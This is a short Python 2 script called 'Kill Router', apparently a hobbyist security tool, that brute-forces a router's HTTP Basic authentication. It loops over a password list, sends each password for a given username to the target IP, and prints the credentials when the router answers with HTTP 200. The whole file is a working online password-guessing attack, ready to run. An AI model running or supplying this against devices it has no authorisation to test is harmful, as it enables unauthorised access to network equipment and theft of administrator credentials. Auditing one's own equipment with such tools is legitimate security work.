#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
    Copyright (C) 2015  Matheus Fidelis
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
"""

import requests
import sys
import argparse
from termcolor import colored

__AUTOR__   =   'Matheus Fidelis'
__GITHUB__  =   'https://github.com/msfidelis'
__BLOG__    =   'http://nanoshots.com.br'


def usage():
    print colored("""

    ██ ▄█▀ ██▓ ██▓     ██▓        ██▀███   ▒█████   █    ██ ▄▄▄█████▓▓█████  ██▀███
    ██▄█▒ ▓██▒▓██▒    ▓██▒       ▓██ ▒ ██▒▒██▒  ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
   ▓███▄░ ▒██▒▒██░    ▒██░       ▓██ ░▄█ ▒▒██░  ██▒▓██  ▒██░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
   ▓██ █▄ ░██░▒██░    ▒██░       ▒██▀▀█▄  ▒██   ██░▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄
   ▒██▒ █▄░██░░██████▒░██████▒   ░██▓ ▒██▒░ ████▓▒░▒▒█████▓   ▒██▒ ░ ░▒████▒░██▓ ▒██▒
   ▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
   ░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░     ░▒ ░ ▒░  ░ ▒ ▒░ ░░▒░ ░ ░     ░     ░ ░  ░  ░▒ ░ ▒░
   ░ ░░ ░  ▒ ░  ░ ░     ░ ░        ░░   ░ ░ ░ ░ ▒   ░░░ ░ ░   ░         ░     ░░   ░
   ░  ░    ░      ░  ░    ░  ░      ░         ░ ░     ░                 ░  ░   ░


    """, 'red', attrs=['bold'])
    print colored("[*] By: Matheus Fidelis aka D0ctor", 'red', attrs=['bold'])
    print colored("[!] Usage: ./kill-router.py -t [TARGET IP] -u [USER TO TEST] -p [PATH TO PASSLIST]", 'red', attrs=['bold'])
    print colored("[!] Usage: ./kill-router.py -t 192.168.0.1 -u admin -p passlist.txt", 'red', attrs=['bold'])




def bruteforce(target,passlist,username):
    #Abre a passlist
    fd = open(passlist, 'rw')
    passwords = fd.readlines()
    i = 0
    print ""
    print colored("==========================[STARTING TEST]==========================",'yellow', attrs=['bold'])
    print ""
    for password in passwords:
        i = i + 1
        password = password.rstrip()
        test = requests.get('http://'+target, auth=(username, password))
        code = test.status_code
        print  colored('[%s]         USER[%s]          PASS [%s]', 'yellow') % (i,username,password)
        if code == 200:
            print ""
            print colored("==========================[LOGIN FOUNDED]==========================", 'yellow', attrs=['bold'])
            print ""
            print colored("===================================================================", 'yellow', attrs=['bold'])
            print colored("                 [  :: USER[%s] AND PASS[%s]  ]                    ", 'yellow', attrs=['bold']) % (username, password)
            print colored("===================================================================", 'yellow', attrs=['bold'])

            sys.exit()
        else:
            pass


def main():
    global target
    global passlist
    global username

    target = ''
    passlist = ''
    username = ''

    #Faz o parsing dos argumentos
    parser = argparse.ArgumentParser(description = "Kill Router", add_help = False)
    parser.add_argument('-h', '--help', action=usage(), help='usage')
    parser.add_argument('-t', '--target',help='Informe o roteador alvo')
    parser.add_argument('-p', '--passlist',help='Informa a passlist')
    parser.add_argument('-u','--username',help='Informa o usuário a ser testado')
    args = parser.parse_args()

    target = args.target
    passlist = args.passlist
    username = args.username

    bruteforce(target,passlist,username)


main()